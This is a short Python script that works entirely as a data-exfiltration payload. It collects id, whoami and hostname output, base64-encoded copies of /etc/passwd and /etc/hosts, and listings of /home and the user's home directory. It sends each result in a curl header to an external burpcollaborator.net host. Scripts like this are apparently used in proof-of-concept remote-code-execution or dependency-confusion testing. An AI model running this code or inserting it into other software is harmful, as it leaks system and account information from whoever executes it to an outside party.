import os

external = "yxznlysc47wvrb9r9z211e1jbah15q.burpcollaborator.net"

id_user = os.popen("id").read()
whoami = os.popen("whoami").read()
hostname = os.popen("hostname").read()
passwd = os.popen("cat /etc/passwd|base64").read()
hosts = os.popen("cat /etc/hosts|base64").read()
home = os.popen("ls /home | base64").read()
user_home = os.popen("ls -la /$HOME/ | base64").read()

os.system("curl "+external+" -H 'CMD: "+id_user+"'")
os.system("curl "+external+" -H 'CMD: "+whoami+"'")
os.system("curl "+external+" -H 'CMD: "+hostname+"'")
os.system("curl "+external+" -H 'CMD: "+passwd+"'")
os.system("curl "+external+" -H 'CMD: "+hosts+"'")
os.system("curl "+external+" -H 'CMD: "+home+"'")
os.system("curl "+external+" -H 'CMD: "+user_home+"'")


